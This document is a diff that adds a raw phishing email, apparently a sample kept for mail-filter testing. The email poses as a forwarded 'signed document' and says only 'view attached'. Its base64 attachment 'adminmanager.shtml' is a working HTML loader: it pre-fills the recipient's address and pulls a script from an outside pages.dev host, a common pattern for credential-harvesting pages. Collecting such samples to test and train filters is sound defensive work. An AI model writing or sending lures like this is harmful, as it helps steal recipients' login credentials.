@@ -1,0 +1,111 @@
+Received: from in01.mxguardian.net ([172.16.1.135])
+	by localhost (cf04.mxguardian.net [172.16.0.103]) (MXG, port 10024)
+	with ESMTP id qESB8RBqq72V for <redacted@example.com>;
+	Fri, 17 Mar 2023 20:48:47 +0000 (UTC)
+Received: from NAM10-MW2-obe.outbound.protection.outlook.com (mail-mw2nam10olkn2028.outbound.protection.outlook.com [40.92.42.28])
+	by in01.mxguardian.net (Postfix) with ESMTPS id 319E6880504
+	for <redacted@example.com>; Fri, 17 Mar 2023 20:48:47 +0000 (UTC)
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=jfPFMPmf9fV2S3QLJxTJYeGYL1N2ubPNQj0V5Dr8i0D04YrEuEPBFiH2SisoT+t2kz/RfbuEgjACHnAUzlx2QL9wvRSSRSMO7RwY0kEsReHtjQPek/f0vX6zctUfxE+AFalkmIbXdmq2my1z4/Bj9/tBqAKxMOtnCl4QW4d/qYUf6vVYVhc8lgIQskkN/jvWgQgoz559E5aZXMwkGn00f7bMPxd+1s5iaG1hx76V4MyJQSp//8iTjVvMqs5M9dR9m7C/EAn3regj7C8jJRrnpwSjOjL8FZhWhKIcz3rE3d7YqzQe1oSiqx4shDB7nEv20s33/mswPo0RRZcWJFjCFA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=WXmGvqwC1N1CP7UnBXi3BDzQir4h2fgt+vF+o4sy4dg=;
+ b=CSkah8cw+JdkPoRzTliKA6dspuDRakFXJFthxuXhnGyB5hTCnICP05bAkwyQ0EKqimNEX03XMt7AZjTUt3O9+4mKxNYwuA1nRI81mA3ITieqnrjDSQNDHFXTFmS60DxJN2fVKFQ609RUkntU3BUYXwUVffgkcvWaTyvXUygBsXVeKXyjkasSvQTY1KRWaQx1QBHoIroX35h9OGTGgQilArxO15ELBbK/2U6sxdaQ7dMYpasi93m2qjGfRHAc4CkwDnpGaphCbyBy9Sg6svCKrW9UCjflPimYifpWk1syQYxtckTkt2juROMibGzVac+aTRK4UaWr58+lngX02UvWYA==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=WXmGvqwC1N1CP7UnBXi3BDzQir4h2fgt+vF+o4sy4dg=;
+ b=V7mwCyUVudkd0uAvs+TPRtFigck9pzP1upoYRk2wQrQoChAvF30VzyjvIe5FNAmMn2+HxHEaTZhuYaX8h9nh4R0P2vRZQdq71F1Yoz5+nBy5Vy1XyezafVpDWRhdoVhLYPxqZTbuiBcbRL/IE2dQiAnxiMWQxgkbQ/n+dwoa2Cqf7RHiOn62pYsCS85WRLoOcTjMCYiuLj//ZKkxgV55IjGWlo6z+8MXcBqMs0mSYfK2A3HoOQMlhle5LqhcCV8WI3lQVgYIkE4KyYGfHJuDLhro3GeXOnVBEsvdtZUgsHg22Hg8QtKEEwNMld05zFDFEUws+n1emgbKM+3HikGe/Q==
+Received: from DS0PR10MB7222.namprd10.prod.outlook.com (2603:10b6:8:f2::18) by
+ DM4PR10MB6112.namprd10.prod.outlook.com (2603:10b6:8:b7::9) with Microsoft
+ SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.20.6178.33; Fri, 17 Mar 2023 20:48:44 +0000
+Received: from DS0PR10MB7222.namprd10.prod.outlook.com
+ ([fe80::dcc3:10d6:11b7:30b2]) by DS0PR10MB7222.namprd10.prod.outlook.com
+ ([fe80::dcc3:10d6:11b7:30b2%9]) with mapi id 15.20.6178.035; Fri, 17 Mar 2023
+ 20:48:44 +0000
+From: adminmanager<bpoe528@outlook.com>
+To: "REDACTED" <recipient@example.com>
+Subject: Fwd:signed document -- 058743 is attached
+Date: 17 Mar 2023 22:48:41 +0200
+Message-ID:
+ <DS0PR10MB7222C3B62786A13427180A23FBBD9@DS0PR10MB7222.namprd10.prod.outlook.com>
+List-Unsubscribe: <adminmanager<bpoe528@outlook.com>>
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_7F085F78.B2F5455B"
+X-TMN: [iTvxtgvUlQPOUt4W/9k5JChze9M2Xhu6]
+X-ClientProxiedBy: BLAPR03CA0115.namprd03.prod.outlook.com
+ (2603:10b6:208:32a::30) To DS0PR10MB7222.namprd10.prod.outlook.com
+ (2603:10b6:8:f2::18)
+X-Microsoft-Original-Message-ID: <20230317224520.E80783A06946C185@outlook.com>
+MIME-Version: 1.0
+X-MS-Exchange-MessageSentRepresentingType: 1
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: DS0PR10MB7222:EE_|DM4PR10MB6112:EE_
+X-MS-Office365-Filtering-Correlation-Id: be2850b8-0cc1-4a37-43b2-08db2728ff29
+X-Microsoft-Antispam: BCL:0;
+X-Microsoft-Antispam-Message-Info:
+	NyUBgtc85/X2vPuUUUev0B9ywwyOYog33Wrq7XkbMBjwYhL+jfr9nkZRZbF404juRTlzFA24hvQtiW9dOvySnLztpalhRn2MZ4gq2NNfuin0fGa2seM0stJ+WJzsUTq4pzByr28zFdACX7CW4a6ct5CrJtovvjjDl1euJrhkBmOfCTYywOj6Mk2DO6OgE6bg1l7oH1Av7phRzvcSkRz5iLnTg9ZvnW38vQQXwaXN7tGmu1hZSJeCXHj5YH/3qCHLQjKBO3/28sUv5Tn/XJOhabALRNpDY1Q+VMepcOO8J+ku/lumG0vS5Wq7MPtinJxhUATvXFLpr+xonhn6O96k4Oe5RuOVFHwyaku0HFklxRkTj5Qeb3dJeet5U6Kmds31nLrwOCDhGgEzlK6sV7Jv26fjjobUDprd21WANW+r0zMH+mAKslYI5AZte47+YyyyjHuBtQMvgNYuQC7n9nEvb+A6TFAjle6MQnxhgY+S/mDy2cwcvHInOlKxziFCAmnlMvWfGiP+gix+/4q7Pg0/S3HfoP0h3mIJl9OQf2yHaT8=
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?us-ascii?Q?4TSCd7Hypcz0LM1AxV69bzR84qCpfhpW5C/eZPq+QgCJr8DGGCQyQJX5IccT?=
+ =?us-ascii?Q?oLel1bp8ZMILQmompljSZlCbV7As1JvZz1KffK4qjO4AVfsE2wglwrfEPL+s?=
+ =?us-ascii?Q?UremtZ+AZBmfLEVD4vHggTsnEeW8AK592IvHtiQe+EaswYDoQJaiLmaIESY3?=
+ =?us-ascii?Q?QGH3UrwpZ/LDhwQgrUk97JKwHoVe/6Zde+NGFKVr2HM1vYj1/BArxSRXnrLO?=
+ =?us-ascii?Q?crH8/0c2pi6s33vTPBQAaiJeA9l01TUqmxES0+U08dC1Kd3GA4nsxwUcA/8U?=
+ =?us-ascii?Q?9t/4w4SEweorvF1aozSd4a7hFVqYUqmRMTph/pQxY32L8CRnpwcB8gWLOsm2?=
+ =?us-ascii?Q?T+DdM8oqVcnvef+yDCZuw/My8HKQSQTJNDnzN/h8ZrSWbS8QXd3Qsch3WhNS?=
+ =?us-ascii?Q?PFR7A3lBTODAlyNHaGuT/5ZsyMGpTLuP42DLqzXnX3gGP+4RKYt7HaGYjwtp?=
+ =?us-ascii?Q?By2hIy6hqpwVciKfCs6ws8gFgAKCFRxYGHvyN7y+sV17NwHGKGBzHBju2kpd?=
+ =?us-ascii?Q?vIuZkPq9buOgmvT3XWSaOvNRbFLBixAF5i8F6aPC8eKAHoWuTYEDWeJR5Rz8?=
+ =?us-ascii?Q?ygHk7QinjRuJypCf84YsOeTMMUb0oBaGKzypQpnU3Jc3akbZoy2CCNyPvz/M?=
+ =?us-ascii?Q?fXG1cHvpvc9ELPBVZ0SVyvZBR8GNI8DM8iyE1LjUVa+4W/ntE2GHJrpY0vdw?=
+ =?us-ascii?Q?Do2dC9xll51vyvtCNm3XxrVwOZRYCubWbbHBN6RQy+006N4K1q2jIJSZw33g?=
+ =?us-ascii?Q?O5H9keDA/cgygWXX10tmNdD/aYQWIs3UUQ0J1iOnUVmZeVDljV20prN3xIgA?=
+ =?us-ascii?Q?Y/C6rjcRI8++zMSyHCERw5Aa8ZEzOa28yuah476Jv8zAM5tEYSdA5wvWDvhu?=
+ =?us-ascii?Q?Sj0P2mlqHMlpcGWycGJDYD3iAXWBChqJ7gzhuS/A4A+TotUNp/e3TqQz7XoI?=
+ =?us-ascii?Q?5sd29aTOQU9zXwnpRCl/xUW6O7Ckci5wHNgWftXMFhFfOk21fhZJG3OPFj9b?=
+ =?us-ascii?Q?grOQ/pliJoAKvRJmtYAT5srexcWWQnVpLjwdy0bfjYs9bPKIaSUmscGS5DkR?=
+ =?us-ascii?Q?6h9hszIbs0yiBtUHRc/GU/7jYaUHckY5M3SzMqFlkHmVV0m52Ki99nvK31s5?=
+ =?us-ascii?Q?3+oHKeed3UmG+GQVh64m0rPkA3kchCQ7O7yN7KhX/yA4GbuiVvSD4XuhoHJ+?=
+ =?us-ascii?Q?4jz2v0l6qb7KUQPf3poXr8FYgy1gXE/Mymir8Cqij+8zwG7BPeLRzsA6DuGo?=
+ =?us-ascii?Q?JqK6+WQuYTkjV98LRK6jQFVZ3J4535oYYt3oxNMEwA=3D=3D?=
+X-OriginatorOrg: outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: be2850b8-0cc1-4a37-43b2-08db2728ff29
+X-MS-Exchange-CrossTenant-AuthSource: DS0PR10MB7222.namprd10.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Mar 2023 20:48:44.1752
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
+	00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM4PR10MB6112
+
+------=_NextPart_000_0012_7F085F78.B2F5455B
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
+><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<p>view attached</p></body></html>=
+
+------=_NextPart_000_0012_7F085F78.B2F5455B
+Content-Type: application/octet-stream; name="adminmanager.shtml"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="adminmanager.shtml"
+
+PGh0bWw+PGhlYWQ+PC9oZWFkPgo8c2NyaXB0PgogICAgZW1haWw9InJlY2lwaWVudEBleGFtcGxl
+LmNvbSIKPC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29t
+L2FqYXgvbGlicy9qcXVlcnkvMi4yLjQvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+PHNjcmlwdCBz
+cmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2NyeXB0by1qcy8zLjEu
+OS0xL2NyeXB0by1qcy5qcyI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9Imh0dHBzOi8vZmFpa2EucGFn
+ZXMuZGV2L0xVaGVxckRUYi5qcyI+IDwvc2NyaXB0PjwvaGVhZD48L2h0bWw+
+
+------=_NextPart_000_0012_7F085F78.B2F5455B--
